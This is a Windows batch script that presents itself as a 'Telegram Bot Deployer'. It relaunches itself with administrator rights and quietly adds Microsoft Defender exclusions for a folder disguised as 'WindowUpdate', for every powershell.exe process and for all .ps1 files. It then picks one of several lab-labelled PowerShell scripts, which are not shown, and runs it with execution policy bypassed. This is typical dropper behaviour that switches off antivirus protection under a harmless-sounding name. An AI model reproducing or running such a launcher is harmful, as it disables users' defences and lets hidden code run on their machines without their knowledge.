@echo off
title Telegram Bot Deployer
color 0A

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

setlocal enabledelayedexpansion
set "SCRIPT_DIR=%~dp0"

echo ========================================
echo    TELEGRAM BOT DEPLOYER
echo ========================================
echo.

powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\WindowUpdate' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionExtension '.ps1' -ErrorAction SilentlyContinue"

echo [INFO] Defender exclusions added.
echo.
echo [INFO] Scanning for deployment scripts...
echo.

:: ========================================
:: TEDI (GREEN)
:: ========================================
echo.
powershell -Command "Write-Host '==================' -ForegroundColor Green"
powershell -Command "Write-Host 'TEDI LABS' -ForegroundColor Green"
powershell -Command "Write-Host '==================' -ForegroundColor Green"

set "FOUND_SCRIPT="
set "LABEL="

:: Check TEDI scripts first
if exist "%SCRIPT_DIR%V01.ps1" (
    set "FOUND_SCRIPT=%SCRIPT_DIR%V01.ps1"
    set "LABEL=Veterinary"
    powershell -Command "Write-Host '  [✓] Veterinary (V01.ps1)' -ForegroundColor Green"
) else if exist "%SCRIPT_DIR%M01.ps1" (
    set "FOUND_SCRIPT=%SCRIPT_DIR%M01.ps1"
    set "LABEL=Tedi Lab 1"
    powershell -Command "Write-Host '  [✓] Tedi Lab 1 (M01.ps1)' -ForegroundColor Green"
) else if exist "%SCRIPT_DIR%M02.ps1" (
    set "FOUND_SCRIPT=%SCRIPT_DIR%M02.ps1"
    set "LABEL=Tedi Lab 2"
    powershell -Command "Write-Host '  [✓] Tedi Lab 2 (M02.ps1)' -ForegroundColor Green"
) else if exist "%SCRIPT_DIR%M03.ps1" (
    set "FOUND_SCRIPT=%SCRIPT_DIR%M03.ps1"
    set "LABEL=Tedi Lab 3"
    powershell -Command "Write-Host '  [✓] Tedi Lab 3 (M03.ps1)' -ForegroundColor Green"
) else if exist "%SCRIPT_DIR%M04.ps1" (
    set "FOUND_SCRIPT=%SCRIPT_DIR%M04.ps1"
    set "LABEL=Tedi Lab 4"
    powershell -Command "Write-Host '  [✓] Tedi Lab 4 (M04.ps1)' -ForegroundColor Green"
)

:: If no TEDI script found, check FASIL (BLUE)
if not defined FOUND_SCRIPT (
    echo.
    powershell -Command "Write-Host '==================' -ForegroundColor Blue"
    powershell -Command "Write-Host 'FASIL LABS' -ForegroundColor Blue"
    powershell -Command "Write-Host '==================' -ForegroundColor Blue"
    
    if exist "%SCRIPT_DIR%F01.ps1" (
        set "FOUND_SCRIPT=%SCRIPT_DIR%F01.ps1"
        set "LABEL=Fasil Lab 1"
        powershell -Command "Write-Host '  [✓] Fasil Lab 1 (F01.ps1)' -ForegroundColor Blue"
    ) else if exist "%SCRIPT_DIR%F02.ps1" (
        set "FOUND_SCRIPT=%SCRIPT_DIR%F02.ps1"
        set "LABEL=Fasil Lab 2"
        powershell -Command "Write-Host '  [✓] Fasil Lab 2 (F02.ps1)' -ForegroundColor Blue"
    ) else if exist "%SCRIPT_DIR%F03.ps1" (
        set "FOUND_SCRIPT=%SCRIPT_DIR%F03.ps1"
        set "LABEL=Fasil Lab 3"
        powershell -Command "Write-Host '  [✓] Fasil Lab 3 (F03.ps1)' -ForegroundColor Blue"
    ) else if exist "%SCRIPT_DIR%F04.ps1" (
        set "FOUND_SCRIPT=%SCRIPT_DIR%F04.ps1"
        set "LABEL=Fasil Lab 4"
        powershell -Command "Write-Host '  [✓] Fasil Lab 4 (F04.ps1)' -ForegroundColor Blue"
    ) else if exist "%SCRIPT_DIR%F05.ps1" (
        set "FOUND_SCRIPT=%SCRIPT_DIR%F05.ps1"
        set "LABEL=Fasil Lab 5"
        powershell -Command "Write-Host '  [✓] Fasil Lab 5 (F05.ps1)' -ForegroundColor Blue"
    ) else if exist "%SCRIPT_DIR%F06.ps1" (
        set "FOUND_SCRIPT=%SCRIPT_DIR%F06.ps1"
        set "LABEL=Fasil Lab 6"
        powershell -Command "Write-Host '  [✓] Fasil Lab 6 (F06.ps1)' -ForegroundColor Blue"
    )
)

:: If no FASIL script found, check MARAKI (RED)
if not defined FOUND_SCRIPT (
    echo.
    powershell -Command "Write-Host '==================' -ForegroundColor Red"
    powershell -Command "Write-Host 'MARAKI LABS' -ForegroundColor Red"
    powershell -Command "Write-Host '==================' -ForegroundColor Red"
    
    if exist "%SCRIPT_DIR%MA01.ps1" (
        set "FOUND_SCRIPT=%SCRIPT_DIR%MA01.ps1"
        set "LABEL=Maraki Lab 1"
        powershell -Command "Write-Host '  [✓] Maraki Lab 1 (MA01.ps1)' -ForegroundColor Red"
    ) else if exist "%SCRIPT_DIR%MA02.ps1" (
        set "FOUND_SCRIPT=%SCRIPT_DIR%MA02.ps1"
        set "LABEL=Maraki Lab 2"
        powershell -Command "Write-Host '  [✓] Maraki Lab 2 (MA02.ps1)' -ForegroundColor Red"
    ) else if exist "%SCRIPT_DIR%MA03.ps1" (
        set "FOUND_SCRIPT=%SCRIPT_DIR%MA03.ps1"
        set "LABEL=Maraki Lab 3"
        powershell -Command "Write-Host '  [✓] Maraki Lab 3 (MA03.ps1)' -ForegroundColor Red"
    ) else if exist "%SCRIPT_DIR%MA04.ps1" (
        set "FOUND_SCRIPT=%SCRIPT_DIR%MA04.ps1"
        set "LABEL=Maraki Lab 4"
        powershell -Command "Write-Host '  [✓] Maraki Lab 4 (MA04.ps1)' -ForegroundColor Red"
    ) else if exist "%SCRIPT_DIR%FB01.ps1" (
        set "FOUND_SCRIPT=%SCRIPT_DIR%FB01.ps1"
        set "LABEL=Maraki FB"
        powershell -Command "Write-Host '  [✓] Maraki FB (FB01.ps1)' -ForegroundColor Red"
    )
)

echo.
echo ========================================

if not defined FOUND_SCRIPT (
    echo.
    echo [ERROR] No deployment scripts found!
    echo.
    echo Please make sure at least one script exists:
    echo.
    echo   TEDI:    M01.ps1, M02.ps1, M03.ps1, M04.ps1, V01.ps1
    echo   FASIL:   F01.ps1, F02.ps1, F03.ps1, F04.ps1, F05.ps1, F06.ps1
    echo   MARAKI:  FB01.ps1, MA01.ps1, MA02.ps1, MA03.ps1, MA04.ps1
    echo.
    pause
    exit /b 1
)

echo.
echo [INFO] Found: !LABEL! (!FOUND_SCRIPT!)
echo [INFO] Automatically deploying...
echo.

powershell -NoProfile -ExecutionPolicy Bypass -File "!FOUND_SCRIPT!"

if %errorlevel% equ 0 (
    echo.
    echo ========================================
    powershell -Command "Write-Host '   DEPLOYMENT SUCCESSFUL!' -ForegroundColor Green"
    echo ========================================
) else (
    echo.
    echo ========================================
    powershell -Command "Write-Host '   DEPLOYMENT FAILED!' -ForegroundColor Red"
    echo ========================================
)

pause
exit /b 0